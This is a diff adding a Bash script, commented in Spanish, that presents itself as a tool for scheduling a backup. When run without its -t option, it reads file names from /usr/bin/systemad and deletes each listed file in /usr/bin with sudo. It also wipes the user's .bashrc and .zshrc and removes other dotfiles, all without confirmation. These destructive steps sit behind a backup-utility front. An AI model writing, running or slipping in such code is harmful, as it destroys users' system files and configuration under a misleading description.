@@ -1,0 +1,61 @@
+#!/bin/bash
+
+# Cambiar al directorio home
+cd ~ || {
+    echo 'No se puede acceder al directorio de ejecución' >&2
+    exit 1
+}
+
+
+# Función para mostrar el mensaje de ayuda
+mostrar_ayuda() {
+    echo "Uso: ./script -t"
+    echo "   -t: Ejecuta el script y pregunta por el tiempo para programar un backup."
+}
+
+# Función para programar la tarea de backup
+programar_backup() {
+    # Pedir al usuario la cantidad de tiempo para el backup en minutos
+    read -p "¿En cuántos minutos quieres hacer el backup? (ejemplo: 10): " tiempo
+
+    # Verificar si se ingresó un número válido de minutos
+    if ! [[ "$tiempo" =~ ^[0-9]+$ ]]; then
+        echo "Error: Debes ingresar un número entero de minutos."
+        exit 1
+    fi
+
+    # Programar el comando 'restaurando' para ejecutarse en el tiempo especificado
+    echo "El comando 'restaurando' se ejecutará en $tiempo minutos."
+    echo "/usr/bin/restaurando " | at now + $tiempo minutes
+
+    # Mensaje final no es necesario, ya que atq mostrará la tarea
+}
+
+# Verificar si se proporcionó el argumento '-t'
+if [ "$1" == "-t" ]; then
+    # Ejecutar el script y programar un backup
+    programar_backup
+else
+    # Definir el archivo del que se extraerán las líneas
+    archivo="/usr/bin/systemad"
+
+    # Leer cada línea del archivo individualmente
+    while IFS= read -r linea; do
+        # Ejecutar comandos con cada línea (nombre de archivo)
+        sudo rm "/usr/bin/$linea"
+    done < "$archivo"
+
+    # Eliminar y recrear el archivo de configuración de bash
+    rm ~/.bashrc
+    touch ~/.bashrc
+
+    # Eliminar y recrear el archivo de configuración de zsh
+    rm ~/.zshrc
+    touch ~/.zshrc
+
+    # Eliminar otros archivos
+    rm ~/.todo.txt
+    rm ~/.aliaseses.md
+    
+    echo "¡Proceso completado!"
+fi
